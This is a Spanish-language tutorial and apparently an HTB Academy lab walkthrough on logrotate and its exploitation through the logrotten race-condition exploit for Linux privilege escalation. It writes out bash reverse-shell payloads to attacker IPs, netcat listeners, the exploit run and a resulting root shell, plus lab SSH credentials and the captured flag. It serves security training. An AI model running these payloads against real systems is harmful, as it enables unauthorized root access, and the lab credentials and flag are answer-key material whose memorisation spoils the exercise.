
# Logrotate

Cada sistema Linux produce grandes cantidades de archivos de registro. Para evitar que el disco duro se desborde, una herramienta llamada `logrotate` se encarga de archivar o eliminar los registros antiguos. Si no se presta atención a los archivos de registro, se vuelven cada vez más grandes y terminan ocupando todo el espacio disponible en el disco.&#x20;

Además, buscar en muchos archivos de registro grandes lleva mucho tiempo. Para evitar esto y ahorrar espacio en el disco, se ha desarrollado una herramienta llamada `logrotate`. Los registros `/var/log` proporcionan a los administradores la información que necesitan para determinar la causa de los fallos. Casi más importantes son los detalles del sistema que pasan desapercibidos, como por ejemplo si todos los servicios se están ejecutando correctamente.

`Logrotate` tiene muchas funciones para gestionar estos archivos de registro, entre ellas la especificación de:

* El `size` del archivo de registro
* El `age`
* Y las medidas `action` que se deben tomar cuando se alcanza uno de estos factores

```shell-session
afsh4ck@kali$ man logrotate
afsh4ck@kali$ # or
afsh4ck@kali]$ logrotate --help

Usage: logrotate [OPTION...] <configfile>
  -d, --debug               Don't do anything, just test and print debug messages
  -f, --force               Force file rotation
  -m, --mail=command        Command to send mail (instead of '/usr/bin/mail')
  -s, --state=statefile     Path of state file
      --skip-state-lock     Do not lock the state file
  -v, --verbose             Display messages during rotation
  -l, --log=logfile         Log file or 'syslog' to log to syslog
      --version             Display version information

Help options:
  -?, --help                Show this help message
      --usage               Display brief usage message
```

La función de la rotación consiste en renombrar los archivos de registro. Por ejemplo, se pueden crear nuevos archivos de registro cada nuevo día y los más antiguos se renombrarán automáticamente. Otro ejemplo de esto sería vaciar el archivo de registro más antiguo y, de esta forma, reducir el consumo de memoria.

Esta herramienta se inicia periódicamente en `cron` y se controla mediante el archivo de configuración `/etc/logrotate.conf`. Este archivo contiene configuraciones globales que determinan la función de `logrotate`.

```sh
afsh4ck@kali$ cat /etc/logrotate.conf


# see "man logrotate" for details

# global options do not affect preceding include directives

# rotate log files weekly
weekly

# use the adm group by default, since this is the owning group
# of /var/log/syslog.
su root adm

# keep 4 weeks worth of backlogs
rotate 4

# create new (empty) log files after rotating old ones
create

# use date as a suffix of the rotated file
#dateext

# uncomment this if you want your log files compressed
#compress

# packages drop log rotation information into this directory
include /etc/logrotate.d

# system-specific logs may also be configured here.
```

Para forzar una nueva rotación en el mismo día, podemos establecer la fecha después de los archivos de registro individuales en el archivo de estado `/var/lib/logrotate.status` o usar la opción `-f`/ :`--force`

```shell-session
afsh4ck@kali$ sudo cat /var/lib/logrotate.status

/var/log/samba/log.smbd" 2022-8-3
/var/log/mysql/mysql.log" 2022-8-3
```

Podemos encontrar los archivos de configuración correspondientes en el directorio `/etc/logrotate.d/`.

```shell-session
afsh4ck@kali$ ls /etc/logrotate.d/

alternatives  apport  apt  bootlog  btmp  dpkg  mon  rsyslog  ubuntu-advantage-tools  ufw  unattended-upgrades  wtmp
```

```shell-session
afsh4ck@kali$ cat /etc/logrotate.d/dpkg

/var/log/dpkg.log {
        monthly
        rotate 12
        compress
        delaycompress
        missingok
        notifempty
        create 644 root root
}
```

## <mark style="color:purple;">Explotar logrotate</mark>

Para explotar `logrotate`, necesitamos algunos requisitos que debemos cumplir.

1. Necesitamos permisos `write` sobre los archivos de registro
2. Logrotate debe ejecutarse como un usuario privilegiado o `root`
3. Versiones vulnerables:
   * `3.8.6`
   * `3.11.0`
   * `3.15.0`
   * `3.18.0`

Existe un exploit prefabricado que podemos utilizar para esto si se cumplen los requisitos. Este exploit se llama [logrotten](https://github.com/whotwagner/logrotten) . Podemos descargarlo y compilarlo en un núcleo similar del sistema de destino y luego transferirlo al sistema de destino. Alternativamente, si podemos compilar el código en el sistema de destino, podemos hacerlo directamente en el sistema de destino.

{% hint style="info" %}
Para que funcione correctamente debemos compilarlo en el sistema linux objetivo
{% endhint %}

```shell-session
logger@nix02:~$ git clone https://github.com/whotwagner/logrotten.git
logger@nix02:~$ cd logrotten
logger@nix02:~$ gcc logrotten.c -o logrotten
```

A continuación, necesitamos ejecutar un payload. Aquí tenemos muchas opciones diferentes que podemos usar. En este ejemplo, ejecutaremos un reverse shell simple basado en bash con la `IP` y `puerto` de nuestra máquina virtual que usaremos para atacar el sistema de destino.

```shell-session
logger@nix02:~$ echo 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1' > payload
```

Sin embargo, antes de ejecutar el exploit, debemos determinar qué opción `logrotate` se usa en `logrotate.conf`.

```shell-session
logger@nix02:~$ grep "create\|compress" /etc/logrotate.conf | grep -v "#"

create
```

En nuestro caso es la opción: `create`. Por lo que tendremos que utilizar el exploit adaptado a esta función.

Después de eso, tenemos que iniciar un listener en nuestra máquina de atacante, que espera la conexión del sistema de destino.

```shell-session
afsh4ck@kali$ nc -nlvp 4444

Listening on 0.0.0.0 4444
```

Como paso final, ejecutamos el exploit con el payload preparado y esperamos un reverse shell como usuario privilegiado o root.

```shell-session
logger@nix02:~$ ./logrotten -p ./payload /tmp/tmp.log
```

```shell-session
...
Listening on 0.0.0.0 4444

Connection received on 10.129.24.11 49818
# id

uid=0(root) gid=0(root) groups=0(root)
```

***

## <mark style="color:purple;">Caso práctico</mark>

```
SSH a 10.129.204.41 (ACADEMY-LLPE-LOG)
Usuario "htb-student"
Contraseña "HTB_@cademy_stdnt!"
```

Aumente los privilegios y envíe el contenido de flag.txt como respuesta.

***

Lo primero que encontramos al acceder es un directorio de `backups` con archivos de logs dentro que se van renombrando, lo que nos puede indicar la presencia de logrotate:

```shell-session
htb-student@ubuntu:~$ ls
backups
htb-student@ubuntu:~$ cd backups/
htb-student@ubuntu:~/backups$ ls
access.log  access.log.1
htb-student@ubuntu:~/backups$ cat access.log
htb-student@ubuntu:~/backups$ cat access.log.1
192.168.0.104 - - [29/Jun/2019:14:39:55 +0000] "GET /robbie03 HTTP/1.1" 404 446 "-" "curl"
```

Lo confirmamos accediendo al directorio `/tmp/logrotate.d`:

```shell-session
htb-student@ubuntu:/etc$ cd logrotate.d/
htb-student@ubuntu:/etc/logrotate.d$ ls
alternatives  apport  apt  bootlog  dpkg  mon  rsyslog  ubuntu-advantage-tools  ufw  unattended-upgrades
```

Si leemos el archivo `mon` obtenemos información relevante, como un archivo `mon.log` dentro del directorio `/home/htb-student/mon`. Esto nos permitiría forzar este archivo de log para ejecutar logrotten, aunque para este ejemplo vamos a crear un archivo `access.log` en el directorio `/backups`, para ver que igualmente es efectivo.

```shell-session
htb-student@ubuntu:/etc/logrotate.d$ cat /etc/logrotate.d/mon
/home/htb-student/mon/mon.log {
	hourly
	rotate 5
	notifempty
	maxsize 1k
	create
}
```

Comprobamos la versión de logrotate y observamos que el vulnerable:

```shell-session
htb-student@ubuntu:/etc/logrotate.d$ logrotate --version
logrotate 3.11.0
```

Retrocedamos un paso y entendamos para qué sirve logrotate. Los archivos de registro se acumulan y, si se desarchivan o se dividen en archivos más pequeños, se vuelven demasiado grandes para ser legibles, por lo que el trabajo de logrotate es limitar cada archivo de registro una vez que alcanza un cierto tamaño especificado y comprimirlo. Estas configuraciones son configurables. Enlace de HackTricks a esta explicación sobre [cómo funciona](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)

### Elevación de privilegios

Ahora vamos a transferir logrotten y lo vamos a compilar en la máquina objetivo, concretamente en el directorio `/dev:shm`:

<figure><img src="/files/VvJMWel9E1xOaAlQMkzE" alt=""><figcaption></figcaption></figure>

Ahora vamos a crear un payload con una reverse shell que se ejecutará una vez que se produzca el logrotate:

```shell-session
htb-student@ubuntu$ echo 'bash -i >& /dev/tcp/10.10.15.44/4444 0>&1' > payload
```

<figure><img src="/files/UOdm2mXz3NVArq2NGtYY" alt=""><figcaption></figcaption></figure>

En la imagen de arriba vemos el proceso de explotación:

* Ya tenemos logrotten compilado en el sistema objetivo
* Abrimos un listener con netcat en nuestro equipo de atacante
* Creamos el payload y ejecutamos logrotten de la siguiente manera:

```shell-session
htb-student@ubuntu:/dev/shm$ ./logrotten -p ./payload /home/htb-student/backups/access.log
```

1. Nos conectamos por SSH en otra terminal y en el directorio backups forzamos el logrotate haciendo un echo hacia el archivo access.log

```shell-session
htb-student@ubuntu:~/backups$ echo testing > access.log
```

2. Al forzarlo se completa el exploit en el sistema objetivo
3. Recibimos una reverse shell como root en el listener de netcat

Solo recibimos la conexión como root durante unos breves segundos, pero más que suficiente para extraer la flag o introducir el comando que queramos:

```shell-session
afsh4ck@kali$ nc -nlvp 4444
listening on [any] 4444 ...
ls (Aquí introducimos el comando que se ejecutará nada más recibir la conexión)
connect to [10.10.15.44] from (UNKNOWN) [10.129.204.41] 52246
root@ubuntu:~# ls
cron_root
flag.txt
log.cfg
log.sh
reset.sh
snap
root@ubuntu:~# cat flag.txt
cat flag.txt
HTB{l0G_r0t7t73N_0ps}
```
